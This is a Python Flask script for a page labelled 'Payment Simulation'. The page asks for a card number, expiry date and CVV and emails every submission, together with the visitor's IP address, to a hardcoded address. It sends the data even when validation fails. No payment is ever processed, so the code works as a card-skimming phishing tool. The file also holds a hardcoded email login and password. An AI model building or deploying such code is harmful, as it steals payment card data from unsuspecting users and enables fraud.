from flask import Flask, request, render_template_string
import datetime
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

app = Flask(__name__)

# بيانات الإيميل (غيّرها ببياناتك)
EMAIL_ADDRESS = "raven.watkins@hotmail.com"
EMAIL_PASSWORD = "AAtt02.2025"
ADMIN_EMAIL = "ana.taroka@gmail.com"

# HTML بالإنجليزي + CSS
HTML = '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Payment</title>
    <style>
        body { font-family: Arial, sans-serif; background: #f4f4f4; margin: 0; padding: 20px; }
        .container { max-width: 600px; margin: auto; background: white; padding: 30px; border-radius: 10px; box-shadow: 0 0 15px rgba(0,0,0,0.1); }
        h1 { text-align: center; color: #333; }
        form { display: flex; flex-direction: column; gap: 15px; }
        label { font-weight: bold; }
        input { padding: 10px; border: 1px solid #ccc; border-radius: 5px; }
        button { background: #28a745; color: white; padding: 12px; border: none; border-radius: 5px; cursor: pointer; font-size: 16px; margin-top: 20px; }
        button:hover { background: #218838; }
        .result { margin-top: 30px; padding: 20px; border-radius: 5px; text-align: center; font-size: 20px; }
        .success { background: #d4edda; color: #155724; }
        .error { background: #f8d7da; color: #721c24; }
    </style>
</head>
<body>
    <div class="container">
        <h1>Payment Simulation</h1>
        <form method="POST">
            <label>Card Number (16 digits):</label>
            <input type="text" name="card_number" maxlength="16" placeholder="e.g. 4111111111111111" required>

            <label>Expiry Date (MM/YY):</label>
            <input type="text" name="expiry" placeholder="e.g. 12/28" maxlength="5" required>

            <label>CVV (3 or 4 digits):</label>
            <input type="text" name="cvv" maxlength="4" placeholder="e.g. 123" required>

            <label>Amount:</label>
            <input type="text" name="amount" value="$1" readonly>

            <button type="submit">Process Payment</button>
        </form>

        {% if message %}
        <div class="result {{ 'success' if success else 'error' }}">
            <strong>{{ message }}</strong>
        </div>
        {% endif %}
    </div>
</body>
</html>
'''

def send_email(card_number, expiry, cvv, amount, ip):
    subject = "New Payment Attempt"
    body = f"""
New payment attempt at: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

Card Number: {card_number}
Expiry Date: {expiry}
CVV: {cvv}
Amount: {amount}
IP Address: {ip}
"""
    msg = MIMEMultipart()
    msg['From'] = EMAIL_ADDRESS
    msg['To'] = ADMIN_EMAIL
    msg['Subject'] = subject
    msg.attach(MIMEText(body, 'plain'))

    try:
        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()
        server.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
        server.sendmail(EMAIL_ADDRESS, ADMIN_EMAIL, msg.as_string())
        server.quit()
    except Exception as e:
        print(f"Email failed: {e}")

@app.route('/', methods=['GET', 'POST'])
def home():
    message = ""
    success = False

    if request.method == 'POST':
        card_number = request.form.get('card_number', '').strip()
        expiry = request.form.get('expiry', '').strip()
        cvv = request.form.get('cvv', '').strip()
        amount = "$1"  # ثابت
        ip = request.remote_addr

        # التحقق
        is_valid = True
        if not (card_number.isdigit() and len(card_number) == 16):
            is_valid = False
            message = "Invalid card number (must be 16 digits)"
        elif not (card_number.startswith('4') or card_number.startswith('5')):
            is_valid = False
            message = "Unsupported card number (must start with 4 or 5)"
        elif not (len(cvv) in [3, 4] and cvv.isdigit()):
            is_valid = False
            message = "Invalid CVV"
        elif not validate_expiry(expiry):
            is_valid = False
            message = "Invalid or expired expiry date"

        if is_valid:
            success = True
            message = "Payment processed successfully!"

        # إرسال البيانات ليك
        send_email(card_number, expiry, cvv, amount, ip)

    return render_template_string(HTML, message=message, success=success)

def validate_expiry(expiry):
    try:
        month, year = map(int, expiry.split('/'))
        if not (1 <= month <= 12):
            return False
        exp_date = datetime.datetime(2000 + year, month, 1)
        return exp_date > datetime.datetime.now()
    except:
        return False

if __name__ == '__main__':
    app.run()
